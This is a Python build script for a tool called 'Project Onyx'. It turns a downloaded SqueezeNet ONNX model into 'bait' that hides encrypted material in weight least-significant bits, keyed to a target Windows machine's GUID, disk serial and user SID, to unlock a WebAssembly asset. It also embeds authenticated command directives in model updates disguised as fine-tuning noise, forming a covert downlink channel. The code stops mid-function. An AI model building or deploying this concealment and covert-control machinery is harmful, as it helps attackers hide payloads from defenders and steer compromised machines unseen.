#!/usr/bin/env python3

"""Build helper for Project Onyx. / Author: X-3306

Generates a legitimate SqueezeNet 1.0 ONNX model, you can change model to bigger if you want (recommended)
modified to act as an AI bait workload and a steganographic weight vault. The host derives 
the decryption key from the target's environmental fingerprint, extracts it from
the least significant bits (LSBs) of the model's float32 weights, verifies
HMACs in constant time, and decrypts the WebAssembly asset. A metadata vault
is retained as a compatible, inspectable fallback.

Generated private artifacts for example:
  assets/model.onnx
  assets/license_module.wasm.aes
"""

from __future__ import annotations

import argparse
import base64
import ctypes
import hashlib
import hmac
import json
import re
import secrets
import sys
import time
import urllib.request
from pathlib import Path
from typing import Any, Optional

import numpy as np
import onnx
from onnx import TensorProto, helper, numpy_helper

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, hmac as crypto_hmac, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

if sys.platform == "win32":
    from ctypes import wintypes


SCHEMA = "onyx-v1"
MAGIC = b"ONX1"
WEIGHT_VAULT_SCHEMA = "onyx-weight-vault-v1"
WEIGHT_VAULT_MAGIC = b"ONXW1\n"
DOWNLINK_SCHEMA = "onyx-downlink-v1"
DOWNLINK_MAGIC = b"ONXD1\n"
WEIGHT_VAULT_BANK_SIZE = 16_384
SALT_LEN = 32
IV_LEN = 16
DEFAULT_KDF_ITERATIONS = 200_000
REAL_BAIT_MODEL_ID = "onnxmodelzoo/squeezenet1.0-12"
REAL_BAIT_MODEL_FILENAME = "squeezenet1.0-12.onnx"
REAL_BAIT_MODEL_URL = (
    "https://huggingface.co/onnxmodelzoo/squeezenet1.0-12/resolve/main/"
    "squeezenet1.0-12.onnx"
)
REAL_BAIT_MODEL_SHA256 = "dec81a8684617770b3cf13fadc1d92565d1d453d23935fc6388b792d99c992bd"
REAL_BAIT_MODEL_INPUT = "data_0"
DEFAULT_COVER_SEED = 2026
DEFAULT_COVER_FRACTION = 0.08
DEFAULT_COVER_NOISE_SCALE = 4.0e-5

VAULT_ENC_INFO = b"onyx-vault-enc-v1"
VAULT_MAC_INFO = b"onyx-vault-mac-v1"
TRIGGER_MAC_INFO = b"onyx-trigger-hmac-v1"
DOWNLINK_ENC_INFO = b"onyx-downlink-enc-v1"
DOWNLINK_MAC_INFO = b"onyx-downlink-mac-v1"
DOWNLINK_TRIGGER_MAC_INFO = b"onyx-downlink-trigger-hmac-v1"

SHA256_RE = re.compile(r"^[0-9a-f]{64}$")
KEY_RE = re.compile(r"^[A-Za-z0-9_+\-/=]{32}$")
SAFE_DOWNLINK_COMMANDS = {"heartbeat_ack", "set_status"}
SAFE_STATUS_RE = re.compile(r"^[A-Za-z0-9_.:+ \-]{1,64}$")


def require_trigger(value: str) -> str:
    trigger = value.strip().lower()
    if not SHA256_RE.fullmatch(trigger):
        raise ValueError("trigger must be exactly 64 lowercase hexadecimal characters")
    return trigger


def require_key_material(value: str) -> str:
    key = value.strip()
    if not KEY_RE.fullmatch(key):
        raise ValueError("secret must be exactly 32 chars from A-Z, a-z, 0-9, _, +, -, /, =")
    return key


def project_root() -> Path:
    return Path(__file__).resolve().parent


def default_real_bait_model_path() -> Path:
    return project_root() / "assets" / "base" / REAL_BAIT_MODEL_FILENAME


def sha256_file(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def ensure_real_bait_model(path: Path | None = None) -> Path:
    model_path = default_real_bait_model_path() if path is None else Path(path)
    if not model_path.exists():
        model_path.parent.mkdir(parents=True, exist_ok=True)
        with urllib.request.urlopen(REAL_BAIT_MODEL_URL, timeout=60) as response:
            model_path.write_bytes(response.read())

    digest = sha256_file(model_path)
    if digest != REAL_BAIT_MODEL_SHA256:
        raise ValueError(
            f"unexpected SHA-256 for {model_path}: {digest}; expected {REAL_BAIT_MODEL_SHA256}"
        )
    return model_path


def _win32_last_error(prefix: str) -> OSError:
    return ctypes.WinError(ctypes.get_last_error(), prefix)


def read_windows_machine_guid() -> str:
    if sys.platform != "win32":
        raise RuntimeError("fingerprint command is only supported on Windows")

    import winreg

    with winreg.OpenKey(
        winreg.HKEY_LOCAL_MACHINE,
        r"SOFTWARE\Microsoft\Cryptography",
        0,
        winreg.KEY_READ | winreg.KEY_WOW64_64KEY,
    ) as key:
        value, _ = winreg.QueryValueEx(key, "MachineGuid")
        return str(value)


def read_windows_volume_serial() -> str:
    if sys.platform != "win32":
        raise RuntimeError("fingerprint command is only supported on Windows")

    serial = wintypes.DWORD()
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    ok = kernel32.GetVolumeInformationW(
        "C:\\",
        None,
        0,
        ctypes.byref(serial),
        None,
        None,
        None,
        0,
    )
    if not ok:
        raise _win32_last_error("GetVolumeInformationW")
    return f"{serial.value:08X}"


def read_windows_current_user_sid() -> str:
    if sys.platform != "win32":
        raise RuntimeError("fingerprint command is only supported on Windows")

    TOKEN_QUERY = 0x0008
    TOKEN_USER = 1
    ERROR_INSUFFICIENT_BUFFER = 122

    class SidAndAttributes(ctypes.Structure):
        _fields_ = [
            ("Sid", wintypes.LPVOID),
            ("Attributes", wintypes.DWORD),
        ]

    class TokenUser(ctypes.Structure):
        _fields_ = [("User", SidAndAttributes)]

    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)

    kernel32.GetCurrentProcess.restype = wintypes.HANDLE
    kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
    kernel32.LocalFree.argtypes = [wintypes.HLOCAL]
    advapi32.OpenProcessToken.argtypes = [
        wintypes.HANDLE,
        wintypes.DWORD,
        ctypes.POINTER(wintypes.HANDLE),
    ]
    advapi32.OpenProcessToken.restype = wintypes.BOOL
    advapi32.GetTokenInformation.argtypes = [
        wintypes.HANDLE,
        wintypes.DWORD,
        wintypes.LPVOID,
        wintypes.DWORD,
        ctypes.POINTER(wintypes.DWORD),
    ]
    advapi32.GetTokenInformation.restype = wintypes.BOOL
    advapi32.ConvertSidToStringSidW.argtypes = [
        wintypes.LPVOID,
        ctypes.POINTER(wintypes.LPWSTR),
    ]
    advapi32.ConvertSidToStringSidW.restype = wintypes.BOOL

    token = wintypes.HANDLE()
    if not advapi32.OpenProcessToken(
        kernel32.GetCurrentProcess(),
        TOKEN_QUERY,
        ctypes.byref(token),
    ):
        return "NO_TOKEN_ACCESS"

    try:
        size = wintypes.DWORD()
        advapi32.GetTokenInformation(token, TOKEN_USER, None, 0, ctypes.byref(size))
        if ctypes.get_last_error() != ERROR_INSUFFICIENT_BUFFER or size.value == 0:
            return "TOKEN_USER_UNREADABLE"

        buffer = ctypes.create_string_buffer(size.value)
        if not advapi32.GetTokenInformation(
            token,
            TOKEN_USER,
            buffer,
            size,
            ctypes.byref(size),
        ):
            return "TOKEN_USER_UNREADABLE"

        token_user = ctypes.cast(buffer, ctypes.POINTER(TokenUser)).contents
        sid_text = wintypes.LPWSTR()
        if not advapi32.ConvertSidToStringSidW(
            token_user.User.Sid,
            ctypes.byref(sid_text),
        ):
            return "SID_CONVERT_FAILED"

        try:
            return sid_text.value
        finally:
            if sid_text:
                kernel32.LocalFree(sid_text)
    finally:
        kernel32.CloseHandle(token)


def compute_windows_fingerprint() -> tuple[str, str]:
    combined = (
        f"MG:{read_windows_machine_guid()}"
        f"|VS:{read_windows_volume_serial()}"
        f"|US:{read_windows_current_user_sid()}"
    )
    return combined, hashlib.sha256(combined.encode("utf-8")).hexdigest()


def b64(data: bytes) -> str:
    return base64.b64encode(data).decode("ascii")


def b64d(text: str) -> bytes:
    return base64.b64decode(text.encode("ascii"), validate=True)


def pbkdf2(trigger_hex: str, salt: bytes, iterations: int) -> bytes:
    return PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=iterations,
        backend=default_backend(),
    ).derive(trigger_hex.encode("ascii"))


def hkdf_expand(master: bytes, info: bytes) -> bytes:
    return HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=info,
        backend=default_backend(),
    ).derive(master)


def derive_keys(trigger_hex: str, salt: bytes, iterations: int) -> tuple[bytes, bytes, bytes]:
    master = pbkdf2(trigger_hex, salt, iterations)
    return (
        hkdf_expand(master, VAULT_ENC_INFO),
        hkdf_expand(master, VAULT_MAC_INFO),
        hkdf_expand(master, TRIGGER_MAC_INFO),
    )


def mac(key: bytes, data: bytes) -> bytes:
    h = crypto_hmac.HMAC(key, hashes.SHA256(), backend=default_backend())
    h.update(data)
    return h.finalize()


def aes_cbc_encrypt_raw(key: bytes, plaintext: bytes) -> tuple[bytes, bytes]:
    iv = secrets.token_bytes(IV_LEN)
    padder = padding.PKCS7(128).padder()
    padded = padder.update(plaintext) + padder.finalize()
    enc = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend()).encryptor()
    return iv, enc.update(padded) + enc.finalize()


def aes_cbc_decrypt_raw(key: bytes, iv: bytes, ciphertext: bytes) -> bytes:
    dec = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend()).decryptor()
    padded = dec.update(ciphertext) + dec.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    return unpadder.update(padded) + unpadder.finalize()


def bytes_to_bits(data: bytes) -> list[int]:
    return [(byte >> shift) & 1 for byte in data for shift in range(7, -1, -1)]


def bits_to_bytes(bits: list[int]) -> bytes:
    if len(bits) % 8 != 0:
        raise ValueError("bit length must be byte-aligned")
    out = bytearray()
    for index in range(0, len(bits), 8):
        value = 0
        for bit in bits[index : index + 8]:
            value = (value << 1) | (bit & 1)
        out.append(value)
    return bytes(out)


def deterministic_positions(
    trigger_hex: str,
    total: int,
    count: int,
    domain: bytes,
    *,
    exclude: set[int] | None = None,
) -> list[int]:
    if count < 0 or total < 0:
        raise ValueError("position count and total must be non-negative")
    excluded = set() if exclude is None else set(exclude)
    if count > total - len(excluded):
        raise ValueError("not enough model weight capacity for weight vault")

    seed = hashlib.sha256(
        b"Project-Onyx weight vault positions v1|" + domain + b"|" + trigger_hex.encode("ascii")
    ).digest()
    selected: list[int] = []
    used = set(excluded)
    counter = 0
    limit = (1 << 64) - ((1 << 64) % total)

    while len(selected) < count:
        block = hashlib.sha256(seed + counter.to_bytes(8, "big")).digest()
        counter += 1
        for offset in range(0, len(block), 8):
            candidate_raw = int.from_bytes(block[offset : offset + 8], "big")
            if candidate_raw >= limit:
                continue
            candidate = candidate_raw % total
            if candidate in used:
                continue
            used.add(candidate)
            selected.append(candidate)
            if len(selected) == count:
                break
    return selected


def float32_weight_lsb_bits(model: onnx.ModelProto) -> list[int]:
    bits: list[int] = []
    for initializer in model.graph.initializer:
        if initializer.data_type != TensorProto.FLOAT:
            continue
        raw = initializer.raw_data
        if not raw and initializer.float_data:
            raw = np.asarray(initializer.float_data, dtype="<f4").tobytes()
        if not raw:
            continue
        bits.extend(byte & 1 for byte in raw[0::4])
    return bits


def set_float32_weight_lsb_bits(
    model: onnx.ModelProto,
    positions: list[int],
    bits: list[int],
) -> None:
    if len(positions) != len(bits):
        raise ValueError("position and bit counts differ")
    bit_by_position = dict(zip(positions, bits))
    cursor = 0
    for initializer in model.graph.initializer:
        if initializer.data_type != TensorProto.FLOAT:
            continue
        count = int(np.prod(initializer.dims, dtype=np.int64)) if initializer.dims else 1
        raw = bytearray(initializer.raw_data)
        if not raw and initializer.float_data:
            raw = bytearray(np.asarray(initializer.float_data, dtype="<f4").tobytes())
        if not raw:
            cursor += count
            continue
        for local_index in range(count):
            global_index = cursor + local_index
            bit = bit_by_position.get(global_index)
            if bit is not None:
                byte_index = local_index * 4
                raw[byte_index] = (raw[byte_index] & 0xFE) | bit
        initializer.raw_data = bytes(raw)
        del initializer.float_data[:]
        cursor += count


def serialize_weight_vault_record(fields: dict[str, str]) -> bytes:
    lines = [f"{key}={fields[key]}" for key in sorted(fields)]
    return WEIGHT_VAULT_MAGIC + ("\n".join(lines) + "\n").encode("utf-8")


def parse_weight_vault_record(data: bytes) -> dict[str, str]:
    if not data.startswith(WEIGHT_VAULT_MAGIC):
        raise ValueError("weight vault magic mismatch")
    fields: dict[str, str] = {}
    for line in data[len(WEIGHT_VAULT_MAGIC) :].decode("utf-8").splitlines():
        if not line:
            continue
        key, sep, value = line.partition("=")
        if not sep:
            raise ValueError("invalid weight vault record")
        fields[key] = value
    if fields.get("weight_vault_schema") != WEIGHT_VAULT_SCHEMA:
        raise ValueError(
            f"unsupported weight vault schema: {fields.get('weight_vault_schema')}"
        )
    del fields["weight_vault_schema"]
    return fields


def embed_weight_vault(model: onnx.ModelProto, trigger_hex: str, fields: dict[str, str]) -> None:
    payload = serialize_weight_vault_record(
        {**fields, "weight_vault_schema": WEIGHT_VAULT_SCHEMA}
    )
    total = len(float32_weight_lsb_bits(model))
    header = len(payload).to_bytes(4, "big")
    header_positions = deterministic_positions(trigger_hex, total, 32, b"header")
    payload_positions = deterministic_positions(
        trigger_hex,
        total,
        len(payload) * 8,
        b"payload",
        exclude=set(header_positions),
    )
    set_float32_weight_lsb_bits(
        model,
        header_positions + payload_positions,
        bytes_to_bits(header) + bytes_to_bits(payload),
    )


def read_weight_vault_fields(trigger_hex: str, model: onnx.ModelProto) -> dict[str, str]:
    bits = float32_weight_lsb_bits(model)
    header_positions = deterministic_positions(trigger_hex, len(bits), 32, b"header")
    payload_len = int.from_bytes(bits_to_bytes([bits[position] for position in header_positions]), "big")
    max_payload = (len(bits) - 32) // 8
    if payload_len <= len(WEIGHT_VAULT_MAGIC) or payload_len > max_payload:
        raise ValueError("invalid weight vault payload length")
    payload_positions = deterministic_positions(
        trigger_hex,
        len(bits),
        payload_len * 8,
        b"payload",
        exclude=set(header_positions),
    )
    payload = bits_to_bytes([bits[position] for position in payload_positions])
    return parse_weight_vault_record(payload)


def vault_fields_from_secret(trigger_hex: str, secret: str, iterations: int) -> dict[str, str]:
    salt = secrets.token_bytes(SALT_LEN)
    vault_key, vault_mac_key, trigger_mac_key = derive_keys(trigger_hex, salt, iterations)

    trigger_hmac = mac(trigger_mac_key, trigger_hex.encode("ascii"))
    iv, ciphertext = aes_cbc_encrypt_raw(vault_key, MAGIC + secret.encode("utf-8"))
    ciphertext_hmac = mac(vault_mac_key, ciphertext)

    return {
        "schema": SCHEMA,
        "kdf": "pbkdf2-hmac-sha256",
        "kdf_iterations": str(iterations),
        "kdf_salt": b64(salt),
        "trigger_hmac": trigger_hmac.hex(),
        "vault_iv": b64(iv),
        "vault_ct": b64(ciphertext),
        "vault_hmac": ciphertext_hmac.hex(),
    }


def unlock_secret_from_fields(trigger_hex: str, fields: dict[str, str]) -> Optional[str]:
    if fields.get("schema") != SCHEMA:
        raise ValueError(f"unsupported schema: {fields.get('schema')}")
    if fields.get("kdf") != "pbkdf2-hmac-sha256":
        raise ValueError(f"unsupported kdf: {fields.get('kdf')}")

    iterations = int(fields["kdf_iterations"])
    salt = b64d(fields["kdf_salt"])
    trigger_expected = bytes.fromhex(fields["trigger_hmac"])
    iv = b64d(fields["vault_iv"])
    ciphertext = b64d(fields["vault_ct"])
    ciphertext_hmac_expected = bytes.fromhex(fields["vault_hmac"])

    vault_key, vault_mac_key, trigger_mac_key = derive_keys(trigger_hex, salt, iterations)
    if not hmac.compare_digest(mac(trigger_mac_key, trigger_hex.encode("ascii")), trigger_expected):
        return None
    if not hmac.compare_digest(mac(vault_mac_key, ciphertext), ciphertext_hmac_expected):
        return None

    try:
        raw = aes_cbc_decrypt_raw(vault_key, iv, ciphertext)
    except Exception:
        return None
    if not raw.startswith(MAGIC):
        return None
    return raw[len(MAGIC):].decode("utf-8")


def derive_downlink_keys(trigger_hex: str, salt: bytes, iterations: int) -> tuple[bytes, bytes, bytes]:
    master = pbkdf2(trigger_hex, salt, iterations)
    return (
        hkdf_expand(master, DOWNLINK_ENC_INFO),
        hkdf_expand(master, DOWNLINK_MAC_INFO),
        hkdf_expand(master, DOWNLINK_TRIGGER_MAC_INFO),
    )


def serialize_key_value_record(magic: bytes, fields: dict[str, str]) -> bytes:
    lines = [f"{key}={fields[key]}" for key in sorted(fields)]
    return magic + ("\n".join(lines) + "\n").encode("utf-8")


def parse_key_value_record(data: bytes, magic: bytes) -> dict[str, str]:
    if not data.startswith(magic):
        raise ValueError("record magic mismatch")
    fields: dict[str, str] = {}
    for line in data[len(magic) :].decode("utf-8").splitlines():
        if not line:
            continue
        key, sep, value = line.partition("=")
        if not sep:
            raise ValueError("invalid key-value record")
        fields[key] = value
    return fields


def float32_weight_values(model: onnx.ModelProto) -> np.ndarray:
    arrays: list[np.ndarray] = []
    for initializer in model.graph.initializer:
        if initializer.data_type != TensorProto.FLOAT:
            continue
        if initializer.raw_data:
            arrays.append(np.frombuffer(initializer.raw_data, dtype="<f4").copy())
        elif initializer.float_data:
            arrays.append(np.asarray(initializer.float_data, dtype="<f4"))
    if not arrays:
        return np.array([], dtype="<f4")
    return np.concatenate(arrays).astype("<f4", copy=False)


def natural_candidate_positions(
    reference_model: onnx.ModelProto,
    update_model: onnx.ModelProto,
    *,
    natural_min_abs_delta: float,
) -> list[int]:
    reference = float32_weight_values(reference_model).astype(np.float64)
    update = float32_weight_values(update_model).astype(np.float64)
    if reference.shape != update.shape:
        raise ValueError("reference and update models expose different float32 weight layouts")
    return np.flatnonzero(np.abs(update - reference) >= natural_min_abs_delta).astype(int).tolist()


def create_lab_finetune_update(
    reference_model: str | Path,
    *,
    natural_min_abs_delta: float,
    seed: int = DEFAULT_COVER_SEED,
    modify_fraction: float = DEFAULT_COVER_FRACTION,
    noise_scale: float = DEFAULT_COVER_NOISE_SCALE,
) -> onnx.ModelProto:
    if not 0.0 < modify_fraction <= 1.0:
        raise ValueError("modify_fraction must be in the range (0, 1]")
    if noise_scale <= 0.0:
        raise ValueError("noise_scale must be positive")

    model = onnx.load(str(reference_model))
    rng = np.random.default_rng(seed)
    float_initializers = [
        initializer
        for initializer in model.graph.initializer
        if initializer.data_type == TensorProto.FLOAT
        and (initializer.raw_data or initializer.float_data)
    ]

    for initializer in float_initializers:
        raw = initializer.raw_data
        if raw:
            values = np.frombuffer(raw, dtype="<f4").copy()
        else:
            values = np.asarray(initializer.float_data, dtype="<f4").copy()

        if values.size:
            selected = rng.random(values.shape) < modify_fraction
            signs = np.where(rng.random(values.shape) >= 0.5, 1.0, -1.0)
            magnitudes = natural_min_abs_delta * 2.0 + np.abs(
                rng.normal(0.0, noise_scale, size=values.shape)
            )
            deltas = np.where(selected, signs * magnitudes, 0.0)
            values = (values.astype(np.float64) + deltas).astype("<f4")

        initializer.raw_data = values.astype("<f4").tobytes()
        del initializer.float_data[:]

    onnx.checker.check_model(model)
    return model


def load_model_as_cover_update(
    reference_model: str | Path,
    *,
    natural_min_abs_delta: float,
    seed: int = DEFAULT_COVER_SEED,
    modify_fraction: float = DEFAULT_COVER_FRACTION,
    noise_scale: float = DEFAULT_COVER_NOISE_SCALE,
) -> onnx.ModelProto:
    return create_lab_finetune_update(
        reference_model,
        natural_min_abs_delta=natural_min_abs_delta,
        seed=seed,
        modify_fraction=modify_fraction,
        noise_scale=noise_scale,
    )


def embed_lsb_record_in_candidates(
    model: onnx.ModelProto,
    trigger_hex: str,
    candidates: list[int],
    payload: bytes,
    *,
    header_domain: bytes,
    payload_domain: bytes,
) -> None:
    required_bits = 32 + len(payload) * 8
    if required_bits > len(candidates):
        raise ValueError(
            f"candidate pool has {len(candidates)} bits, downlink requires {required_bits} bits"
        )
    header = len(payload).to_bytes(4, "big")
    header_offsets = deterministic_positions(trigger_hex, len(candidates), 32, header_domain)
    payload_offsets = deterministic_positions(
        trigger_hex,
        len(candidates),
        len(payload) * 8,
        payload_domain,
        exclude=set(header_offsets),
    )
    positions = [candidates[offset] for offset in header_offsets + payload_offsets]
    set_float32_weight_lsb_bits(
        model,
        positions,
        bytes_to_bits(header) + bytes_to_bits(payload),
    )


def read_lsb_record_from_candidates(
    model: onnx.ModelProto,
    trigger_hex: str,
    candidates: list[int],
    *,
    header_domain: bytes,
    payload_domain: bytes,
    min_payload_len: int,
) -> Optional[bytes]:
    if len(candidates) < 32:
        return None
    bits = float32_weight_lsb_bits(model)
    header_offsets = deterministic_positions(trigger_hex, len(candidates), 32, header_domain)
    try:
        payload_len = int.from_bytes(
            bits_to_bytes([bits[candidates[offset]] for offset in header_offsets]),
            "big",
        )
    except IndexError:
        return None
    max_payload_len = (len(candidates) - 32) // 8
    if payload_len < min_payload_len or payload_len > max_payload_len:
        return None
    payload_offsets = deterministic_positions(
        trigger_hex,
        len(candidates),
        payload_len * 8,
        payload_domain,
        exclude=set(header_offsets),
    )
    try:
        return bits_to_bytes([bits[candidates[offset]] for offset in payload_offsets])
    except IndexError:
        return None


def validate_downlink_directive(directive: dict[str, Any], *, now_unix: int | None = None) -> dict[str, Any]:
    command = str(directive.get("type", ""))
    if command not in SAFE_DOWNLINK_COMMANDS:
        raise ValueError(f"downlink command is not allowed: {command!r}")

    nonce = str(directive.get("nonce", ""))
    if not re.fullmatch(r"[A-Za-z0-9_.:+\-]{1,96}", nonce):
        raise ValueError("downlink nonce must be 1-96 safe characters")

    expires_unix = int(directive.get("expires_unix", 0))
    if expires_unix <= 0:
        raise ValueError("downlink expires_unix must be a positive Unix timestamp")
    if now_unix is not None and expires_unix < now_unix:
        raise ValueError("downlink directive expired")

    normalized: dict[str, Any] = {
        "type": command,
        "nonce": nonce,
        "expires_unix": expires_unix,
    }
    if command == "set_status":
        status = str(directive.get("status", ""))
        if not SAFE_STATUS_RE.fullmatch(status):
            raise ValueError("set_status value contains unsupported characters or length")
        normalized["status"] = status
    return normalized


def downlink_fields_from_directive(
    trigger_hex: str,
    directive: dict[str, Any],
    iterations: int,
) -> dict[str, str]:
    salt = secrets.token_bytes(SALT_LEN)
    enc_key, mac_key, trigger_mac_key = derive_downlink_keys(trigger_hex, salt, iterations)
    payload = json.dumps(
        validate_downlink_directive(directive),
        sort_keys=True,
        separators=(",", ":"),
    ).encode("utf-8")
    iv, ciphertext = aes_cbc_encrypt_raw(enc_key, DOWNLINK_MAGIC + payload)
    return {
        "downlink_schema": DOWNLINK_SCHEMA,
        "kdf": "pbkdf2-hmac-sha256",
        "kdf_iterations": str(iterations),
        "kdf_salt": b64(salt),
        "trigger_hmac": mac(trigger_mac_key, b"onyx-downlink-v1|" + trigger_hex.encode("ascii")).hex(),
        "downlink_iv": b64(iv),
        "downlink_ct": b64(ciphertext),
        "downlink_hmac": mac(mac_key, iv + ciphertext).hex(),
    }


def directive_from_downlink_fields(
    trigger_hex: str,
    fields: dict[str, str],
    *,
    now_unix: int | None = None,
) -> Optional[dict[str, Any]]:
    if fields.get("downlink_schema") != DOWNLINK_SCHEMA:
        return None
    if fields.get("kdf") != "pbkdf2-hmac-sha256":
        return None
    try:
        iterations = int(fields["kdf_iterations"])
        salt = b64d(fields["kdf_salt"])
        trigger_expected = bytes.fromhex(fields["trigger_hmac"])
        iv = b64d(fields["downlink_iv"])
        ciphertext = b64d(fields["downlink_ct"])
        hmac_expected = bytes.fromhex(fields["downlink_hmac"])
    except (KeyError, ValueError):
        return None

    enc_key, mac_key, trigger_mac_key = derive_downlink_keys(trigger_hex, salt, iterations)
    trigger_got = mac(trigger_mac_key, b"onyx-downlink-v1|" + trigger_hex.encode("ascii"))
    if not hmac.compare_digest(trigger_got, trigger_expected):
        return None
    if not hmac.compare_digest(mac(mac_key, iv + ciphertext), hmac_expected):
        return None
    try:
        raw = aes_cbc_decrypt_raw(enc_key, iv, ciphertext)
    except Exception:
        return None
    if not raw.startswith(DOWNLINK_MAGIC):
        return None
    try:
        directive = json.loads(raw[len(DOWNLINK_MAGIC) :].decode("utf-8"))
        return validate_downlink_directive(directive, now_unix=now_unix)
    except (json.JSONDecodeError, UnicodeDecodeError, ValueError):
        return None


def build_downlink_update(args: argparse.Namespace) -> None:
    trigger = require_trigger(args.trigger)
    reference_path = Path(args.reference_model)
    reference = onnx.load(str(reference_path))
    if args.cover_model:
        update = onnx.load(str(args.cover_model))
    else:
        update = load_model_as_cover_update(
            reference_path,
            natural_min_abs_delta=args.natural_min_abs_delta,
            seed=getattr(args, "cover_seed", DEFAULT_COVER_SEED),
            modify_fraction=getattr(args, "cover_fraction", DEFAULT_COVER_FRACTION),
            noise_scale=getattr(args, "cover_noise_scale", DEFAULT_COVER_NOISE_SCALE),
        )

    directive: dict[str, Any] = {
        "type": args.command,
        "nonce": args.nonce or secrets.token_hex(12),
        "expires_unix": int(args.expires_unix or (int(time.time()) + 3600)),
    }
    if args.command == "set_status":
        directive["status"] = args.status
    directive = validate_downlink_directive(directive)
    fields = downlink_fields_from_directive(trigger, directive, args.iterations)
    payload = serialize_key_value_record(DOWNLINK_MAGIC, fields)
    candidates = natural_candidate_positions(
        reference,
        update,
        natural_min_abs_delta=args.natural_min_abs_delta,
    )
    embed_lsb_record_in_candidates(
        update,
        trigger,
        candidates,
        payload,
        header_domain=b"downlink-header-v1",
        payload_domain=b"downlink-payload-v1",
    )
    output = Path(args.output)
    output.parent.mkdir(parents=True, exist_ok=True)
    onnx.checker.check_model(update)
    onnx.save(update, str(output))
    digest = hashlib.sha256(output.read_bytes()).hexdigest()
    print(f"[+] Downlink model update: {output} ({output.stat().st_size} bytes)")
    print(f"[+] SHA-256: {digest}")
    print(f"[+] Directive: {json.dumps(directive, sort_keys=True, separators=(',', ':'))}")


def extract_downlink_directive(
    trigger_hex: str,
    reference_model: str | Path,
    update_model: str | Path,
    *,
    natural_min_abs_delta: float,
    now_unix: int | None = None,
) -> Optional[dict[str, Any]]:
    trigger = require_trigger(trigger_hex)
    reference = onnx.load(str(reference_model))
    update = onnx.load(str(update_model))
    candidates = natural_candidate_positions(
        reference,
        update,
        natural_min_abs_delta=natural_min_abs_delta,
    )
    payload = read_lsb_record_from_candidates(
        update,
        trigger,
        candidates,
        header_domain=b"downlink-header-v1",
        payload_domain=b"downlink-payload-v1",
        min_payload_len=len(DOWNLINK_MAGIC) + len("downlink_schema=x\n"),
    )
    if payload is None or not payload.startswith(DOWNLINK_MAGIC):
        return None
    try:
        fields = parse_key_value_record(payload, DOWNLINK_MAGIC)
    except ValueError:
        return None
    return directive_from_downlink_fields(trigger, fields, now_unix=now_unix)


def verify_downlink(args: argparse.Namespace) -> None:
    directive = extract_downlink_directive(
        args.trigger,
        Path(args.reference_model),
        Path(args.model),
        natural_min_abs_delta=args.natural_min_abs_delta,
        now_unix=int(time.time()),
    )
    if directive is None:
        print("[-] No authenticated downlink directive")
        raise SystemExit(1)
    print(f"[+] DOWNLINK: {json.dumps(directive, sort_keys=True, separators=(',', ':'))}")


def load_real_bait_model(base_model: str | Path | None = None) -> onnx.ModelProto:
    source_path = Path(base_model) if base_model else ensure_real_bait_model()
    if not source_path.exists():
        source_path = ensure_real_bait_model(source_path)
    model = onnx.load(str(source_path))
    onnx.checker.check_model(model)
    if not model.graph.input:
        raise ValueError("real bait model has no graph inputs")
    first_input = model.graph.input[0]
    tensor_type = first_input.type.tensor_type
    if first_input.name != REAL_BAIT_MODEL_INPUT or tensor_type.elem_type != TensorProto.FLOAT:
        raise ValueError(
            "expected SqueezeNet ONNX input data_0 with FLOAT tensor type; "
            f"got {first_input.name!r}"
        )
    if len(float32_weight_lsb_bits(model)) < 100_000:
        raise ValueError("real bait model does not expose enough float32 weights")
    set_meta(model, "onyx_bait_model_id", REAL_BAIT_MODEL_ID)
    set_meta(model, "onyx_bait_model_source", REAL_BAIT_MODEL_URL)
    set_meta(model, "onyx_bait_model_sha256", sha256_file(source_path))
    return model


def create_tiny_bait_model() -> onnx.ModelProto:
    """Create a small deterministic MLP-like ONNX graph.

    The graph is intentionally useful as a real ONNX Runtime bait workload but
    is not responsible for releasing key material. The protected material is in
    authenticated metadata.
    """
    rng = np.random.default_rng(0x0A11CE)
    w1 = rng.normal(0.0, 0.05, size=(16, 8)).astype(np.float32)
    b1 = rng.normal(0.0, 0.01, size=(8,)).astype(np.float32)
    w2 = rng.normal(0.0, 0.05, size=(8, 4)).astype(np.float32)
    b2 = rng.normal(0.0, 0.01, size=(4,)).astype(np.float32)
    stego_bank = rng.normal(0.0, 0.02, size=(WEIGHT_VAULT_BANK_SIZE,)).astype(np.float32)
    zero = np.array([0.0], dtype=np.float32)

    inputs = [
        helper.make_tensor_value_info("input_ids", TensorProto.INT64, [1, 16]),
        helper.make_tensor_value_info("attention_mask", TensorProto.INT64, [1, 16]),
    ]
    outputs = [helper.make_tensor_value_info("logits", TensorProto.FLOAT, [1, 4])]
    initializers = [
        numpy_helper.from_array(w1, "w1"),
        numpy_helper.from_array(b1, "b1"),
        numpy_helper.from_array(w2, "w2"),
        numpy_helper.from_array(b2, "b2"),
        numpy_helper.from_array(stego_bank, "stego_bank"),
        numpy_helper.from_array(zero, "zero"),
    ]
    nodes = [
        helper.make_node("Cast", ["input_ids"], ["ids_f"], to=TensorProto.FLOAT),
        helper.make_node("Cast", ["attention_mask"], ["mask_f"], to=TensorProto.FLOAT),
        helper.make_node("Mul", ["ids_f", "mask_f"], ["masked"]),
        helper.make_node("MatMul", ["masked", "w1"], ["hidden_mm"]),
        helper.make_node("Add", ["hidden_mm", "b1"], ["hidden_pre"]),
        helper.make_node("Relu", ["hidden_pre"], ["hidden"]),
        helper.make_node("MatMul", ["hidden", "w2"], ["out_mm"]),
        helper.make_node("Add", ["out_mm", "b2"], ["out_pre"]),
        helper.make_node("ReduceSum", ["stego_bank"], ["stego_sum"], keepdims=0),
        helper.make_node("Mul", ["stego_sum", "zero"], ["stego_zero"]),
